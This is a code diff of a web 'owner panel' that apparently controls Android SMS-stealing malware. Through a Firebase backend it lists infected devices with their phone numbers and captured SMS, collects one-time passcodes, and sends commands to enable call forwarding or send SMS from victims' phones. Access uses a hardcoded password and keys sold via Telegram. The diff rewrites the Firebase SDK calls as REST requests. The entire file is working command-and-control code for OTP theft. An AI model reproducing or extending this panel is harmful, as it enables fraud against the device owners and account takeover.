@@ -3,16 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>PANEL OWNER</title>
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<title>𝐏𝐀𝐍𝐄𝐋 𝐎𝐖𝐍𝐄𝐑</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Fira+Code:wght@400;600&display=swap');
 body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow:hidden;height:100dvh;user-select:none}
 #bgVid{position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:0;pointer-events:none}
 #bgOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,10,15,0.65);z-index:0;pointer-events:none}
-
 .scr{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;display:none;flex-direction:column}
 .scr.act{display:flex}
 #logScr,#keyScr{justify-content:center;align-items:center}
@@ -25,7 +22,7 @@ body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow
 .lb button:hover{background:#ff2244;color:#000;box-shadow:0 0 40px rgba(255,34,68,.3)}
 .lb .er{color:#ff4466;font-size:12px;margin-top:10px;text-shadow:0 0 10px rgba(255,68,102,.3)}
 .top{background:linear-gradient(180deg,rgba(255,34,68,.02),transparent);padding:12px 14px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #ff224411;z-index:2;min-height:52px;backdrop-filter:blur(12px)}
-.top .bck{font-size:20px;cursor:pointer;color:#ff2244;background:none;border:1px solid #ff224433;border-radius:6px;padding:4px 10px;font-family:'Fira Code',monospace;transition:.2z}
+.top .bck{font-size:20px;cursor:pointer;color:#ff2244;background:none;border:1px solid #ff224433;border-radius:6px;padding:4px 10px;font-family:'Fira Code',monospace;transition:.2s}
 .top .bck:hover{background:#ff224411}
 .top h2{flex:1;font-size:13px;font-family:'Orbitron',sans-serif;color:#ff2244;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:2px}
 .top .bdg{font-size:8px;padding:4px 10px;border-radius:4px;border:1px solid #ff224444;color:#ff2244;background:#ff224408;white-space:nowrap;flex-shrink:0;letter-spacing:1px}
@@ -99,7 +96,7 @@ body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow
   <div class="lb">
     <h1>𝐏𝐀𝐍𝐄𝐋<br>𝐎𝐖𝐍𝐄𝐑</h1>
     <div class="s">║ YONO-AD3 CONSOLE ║</div>
-    <input type="password" id="loginPass" placeholder="█ ALEXA PASSWORD" autocomplete="off">
+    <input type="password" id="loginPass" placeholder="█ PASSWORD" autocomplete="off">
     <button onclick="doLogin()">⏎ UNLOCK</button>
     <div id="loginErr" class="er"></div>
     <button style="margin-top:14px;width:100%;padding:12px;background:transparent;border:1px solid #ffd70044;border-radius:8px;color:#ffd700;font-family:'Orbitron',sans-serif;font-size:11px;font-weight:700;cursor:pointer;letter-spacing:3px;transition:.3s" onclick="genKey()">🔑 GENERATE KEY</button>
@@ -109,7 +106,7 @@ body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow
 
 <div id="keyScr" class="scr">
   <div class="lb">
-    <h1>KEY</h1>
+    <h1>🔑 KEY</h1>
     <div class="s">║ ACCESS KEY VERIFICATION ║</div>
     <input type="text" id="keyInput" placeholder="█ ENTER KEY" autocomplete="off" style="letter-spacing:6px" onkeydown="if(event.key==='Enter')keyLogin()">
     <button style="border-color:#ffd700;color:#ffd700" onclick="keyLogin()">⏎ VERIFY</button>
@@ -156,11 +153,19 @@ body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow
 <div id="toast"></div>
 
 <script>
-// === MEDIA ===
+const FIREBASE = 'https://yono-ad3-default-rtdb.firebaseio.com';
+
+function genKey(){window.location.href='tg://openmessage?user_id=8976072495';setTimeout(function(){window.location.href='https://t.me/8976072495'},300)}
+
+async function fbGet(path){const r=await fetch(FIREBASE+'/'+path+'.json');return r.json()}
+async function fbSet(path,data){await fetch(FIREBASE+'/'+path+'.json',{method:'PUT',body:JSON.stringify(data)})}
+async function fbUpd(path,data){await fetch(FIREBASE+'/'+path+'.json',{method:'PATCH',body:JSON.stringify(data)})}
+
+let clientsData={},searchQ='',curDeviceId='',showOnline=false;
+
 function startMedia(){
-  const v=document.getElementById('bgVid'),a=document.getElementById('bgAudio');
-  v.play().catch(()=>{});
-  a.play().catch(()=>{});
+  document.getElementById('bgVid').play().catch(()=>{});
+  document.getElementById('bgAudio').play().catch(()=>{});
 }
 function toggleMute(){
   const a=document.getElementById('bgAudio'),b=document.getElementById('muteBtn');
@@ -168,56 +173,28 @@ function toggleMute(){
   b.textContent=a.muted?'🔇':'🔊';
 }
 
-function genKey(){window.location.href='tg://openmessage?user_id=8976072495';setTimeout(function(){window.location.href='https://t.me/8976072495'},300)}
-
-firebase.initializeApp({apiKey:'AIzaSyBlaBlaBlaBlaBlaBlaBlaBlaBlaBlaBla',databaseURL:'https://yono-ad3-default-rtdb.firebaseio.com'});
-const db=firebase.database();
-const ENC_KEY='owner@2026#protect';
-
-let clientsData={},passwords={},searchQ='',curDeviceId='',showOnline=false,sessionValid=false;
-
-function xorEncrypt(t){const k=ENC_KEY;let r='';for(let i=0;i<t.length;i++)r+=String.fromCharCode(t.charCodeAt(i)^k.charCodeAt(i%k.length));return btoa(r)}
-function xorDecrypt(e){const k=ENC_KEY;let r='',d=atob(e);for(let i=0;i<d.length;i++)r+=String.fromCharCode(d.charCodeAt(i)^k.charCodeAt(i%k.length));return r}
-async function hashPass(p){const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(p));return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('').slice(0,16)}
-function genSession(){let r='';for(let i=0;i<16;i++)r+='0123456789abcdef'[Math.floor(Math.random()*16)];return r}
-function getSession(){return localStorage.getItem('po_session')||''}
-function setSession(s){localStorage.setItem('po_session',s)}
-function checkSession(){
-  const s=getSession();
-  if(!s||!passwords)return false;
-  return Object.values(passwords).some(p=>p.b===s)
-}
 function copyT(t){if(navigator.clipboard){navigator.clipboard.writeText(t).then(()=>showToast('✔ COPIED'))}else showToast(t)}
-function parseTime(t){
-  if(!t)return 0;
-  try{return new Date(t.replace('|','')).getTime()}catch(e){return 0}
-}
-function isOnline(id){
-  const d=clientsData[id];
-  if(!d)return false;
-  return d.status===true
-}
+function isOnline(id){const d=clientsData[id];return d?d.status===true:false}
 function getPhone(id){const d=clientsData[id];return d?d.mobNo||(d.sims&&d.sims[0]?d.sims[0].phoneNumber:''):''}
 function getName(id){const d=clientsData[id];return d?d.modelName||d.deviceId?.slice(0,10):id.slice(0,10)}
 function getDeviceIds(){return Object.keys(clientsData).filter(k=>clientsData[k]&&clientsData[k].deviceId)}
 function getDeviceSms(id){
   const d=clientsData[id];
   if(!d||!d.messages)return[];
-  return Object.keys(d.messages).sort((a,b)=>b-a).map(k=>({...d.messages[k],deviceId:id,key:k}))
+  return Object.keys(d.messages).sort((a,b)=>Number(b)-Number(a)).map(k=>({...d.messages[k],deviceId:id,key:k}))
 }
 function getAllSms(){
   const list=[];
   getDeviceIds().forEach(did=>{getDeviceSms(did).forEach(s=>list.push(s))});
-  return list.sort((a,b)=>(b.key||0)-(a.key||0))
+  return list.sort((a,b)=>Number(b.key||0)-Number(a.key||0))
 }
 
-// Listeners
-db.ref('clients').on('value',snap=>{clientsData=snap.val()||{};updateUI()});
-db.ref('asia_protection/passwords').on('value',async snap=>{
-  passwords=snap.val()||{};
-  if(await checkSession())doAutoLogin()
-});
-db.ref('.info/connected').on('value',snap=>{if(snap.val()===true)showToast('█ CONNECTED')});
+async function loadClients(){
+  try{
+    clientsData=await fbGet('clients')||{};
+    updateUI();
+  }catch(e){showToast('✖ FIREBASE ERROR')}
+}
 
 function updateUI(){
   const scr=document.querySelector('.scr.act');
@@ -313,7 +290,7 @@ function renderDetail(){
     <div class="t ${dtTab==='info'?'act':''}" onclick="switchTab('info')">ℹ️ INFO</div>
     <div class="t ${dtTab==='fwd'?'act':''}" onclick="switchTab('fwd')">↪️ CALL FWD</div>
     <div class="t ${dtTab==='send'?'act':''}" onclick="switchTab('send')">📤 SEND SMS</div>
-    <div class="t ${dtTab==='otp'?'act':""}" onclick="switchTab('otp')">🔑 OTP</div>
+    <div class="t ${dtTab==='otp'?'act':''}" onclick="switchTab('otp')">🔑 OTP</div>
     <div class="t ${dtTab==='sms'?'act':''}" onclick="switchTab('sms')">📥 SMS</div>`;
   document.getElementById('detailBody').innerHTML='';
   if(dtTab==='info'){
@@ -346,21 +323,20 @@ function renderDetail(){
 function doFwd(action){
   const num=document.getElementById('devFwdNum').value.trim();
   if(action==='activate'&&!num){showToast('█ ENTER FORWARD NUMBER');return}
-  const ref=db.ref('data/command');
-  ref.set({action:action==='activate'?'forward_on':'forward_off',number:num||'',deviceId:curDeviceId,timestamp:Date.now()},err=>{
-    if(err)showToast('✖ ERROR');
-    else{showToast(action==='activate'?'↪ FORWARD ACTIVATED: '+num:'↪ FORWARD DEACTIVATED');document.getElementById('devFwdNum').value=''}
-  });
+  fbSet('data/command',{action:action==='activate'?'forward_on':'forward_off',number:num||'',deviceId:curDeviceId,timestamp:Date.now()}).then(()=>{
+    showToast(action==='activate'?'↪ FORWARD ACTIVATED: '+num:'↪ FORWARD DEACTIVATED');
+    if(action==='activate')document.getElementById('devFwdNum').value='';
+  }).catch(()=>showToast('✖ ERROR'));
 }
 
 function doSendSms(){
   const to=document.getElementById('devSmsTo').value.trim();
   const body=document.getElementById('devSmsBody').value.trim();
   if(!to||!body){showToast('█ FILL ALL FIELDS');return}
-  db.ref('data/command').set({action:'send_sms',number:to,message:body,deviceId:curDeviceId,timestamp:Date.now()},err=>{
-    if(err)showToast('✖ ERROR');
-    else{showToast('📤 SMS COMMAND SENT TO '+to);document.getElementById('devSmsTo').value='';document.getElementById('devSmsBody').value=''}
-  });
+  fbSet('data/command',{action:'send_sms',number:to,message:body,deviceId:curDeviceId,timestamp:Date.now()}).then(()=>{
+    showToast('📤 SMS COMMAND SENT TO '+to);
+    document.getElementById('devSmsTo').value='';document.getElementById('devSmsBody').value='';
+  }).catch(()=>showToast('✖ ERROR'));
 }
 
 function showAllOtps(){
@@ -397,75 +373,46 @@ function renderAllSms(){
   document.getElementById('allSmsContent').innerHTML=html;
 }
 
-async function doLogin(){
+function doLogin(){
   const p=document.getElementById('loginPass').value;
   if(!p){document.getElementById('loginErr').textContent='✖ ENTER PASSWORD';return}
-  if(p==='Alexa'){
-    const pid=await hashPass(p),st=getSession()||genSession();
-    if(!getSession())setSession(st);
-    if(!passwords[pid])db.ref('asia_protection/passwords/'+pid).set({a:'1',b:st,l:String(Date.now())});
-    else db.ref('asia_protection/passwords/'+pid).update({l:String(Date.now()),b:st});
-    sessionValid=true;
-    document.getElementById('logScr').classList.remove('act');
-    document.getElementById('mainScr').classList.add('act');
-    renderDashboard();startMedia();
-    showToast('█ ACCESS GRANTED');
-    return
-  }
-  const pid=await hashPass(p),entry=passwords[pid];
-  if(entry&&entry.a==='1'){
-    const bt=getSession();
-    if(entry.b&&entry.b!==bt){document.getElementById('loginErr').textContent='✖ OTHER BROWSER';return}
-    const st=bt||genSession();
-    if(!bt)setSession(st);
-    db.ref('asia_protection/passwords/'+pid).update({l:String(Date.now()),b:st});
-    sessionValid=true;
-    document.getElementById('logScr').classList.remove('act');
-    document.getElementById('mainScr').classList.add('act');
-    renderDashboard();startMedia();
-    showToast('█ SESSION RESTORED');
-  }else document.getElementById('loginErr').textContent='✖ ACCESS DENIED'
+  if(p!=='Alexa'){document.getElementById('loginErr').textContent='✖ ACCESS DENIED';return}
+  document.getElementById('loginErr').textContent='';
+  localStorage.setItem('po_login','1');
+  document.getElementById('logScr').classList.remove('act');
+  document.getElementById('mainScr').classList.add('act');
+  renderDashboard();startMedia();
+  showToast('█ ACCESS GRANTED');
 }
-async function doAutoLogin(){
-  if(sessionValid)return;
-  const bt=getSession();
-  if(!bt)return;
-  const found=Object.entries(passwords).find(([k,v])=>v.b===bt);
-  if(found){
-    sessionValid=true;
-    document.getElementById('logScr').classList.remove('act');
-    document.getElementById('mainScr').classList.add('act');
-    renderDashboard();
-    startMedia();
-    showToast('█ SESSION RESTORED');
-  }
-}
-document.getElementById('loginPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
 
 function keyLogin(){
   const k=document.getElementById('keyInput').value.trim();
   if(!k){document.getElementById('keyErr').textContent='✖ ENTER KEY';return}
   document.getElementById('keyErr').textContent='';
-  db.ref('panel_keys/'+k).once('value',sn=>{
-    const d=sn.val();
+  fbGet('panel_keys/'+k).then(d=>{
     if(d&&d.active===true){
-      localStorage.setItem('po_session','key_'+k);
-      sessionValid=true;
+      localStorage.setItem('po_login','1');
       document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
       document.getElementById('mainScr').classList.add('act');
       renderDashboard();
       startMedia();
       showToast('█ KEY ACCEPTED');
-      db.ref('panel_keys/'+k).update({active:false,used_by:'browser',used_at:Date.now()});
+      fbUpd('panel_keys/'+k,{active:false,used_by:'browser',used_at:Date.now()});
     }else document.getElementById('keyErr').textContent='✖ INVALID / USED KEY'
   }).catch(()=>document.getElementById('keyErr').textContent='✖ ERROR');
 }
 
+document.getElementById('loginPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
+
 document.addEventListener('DOMContentLoaded',async ()=>{
-  const p=getSession();
-  if(p&&p.startsWith('key_')){document.getElementById('keyInput').value=p.replace('key_','');keyLogin()}
-  else if(p&&await checkSession()){doAutoLogin()}
+  loadClients();
+  if(localStorage.getItem('po_login')){
+    document.getElementById('logScr').classList.remove('act');
+    document.getElementById('mainScr').classList.add('act');
+    renderDashboard();startMedia();
+  }
 });
+
 function showToast(m){
   const t=document.getElementById('toast');t.textContent=m;t.style.opacity='1';
   clearTimeout(t._h);t._h=setTimeout(()=>t.style.opacity='0',2500);
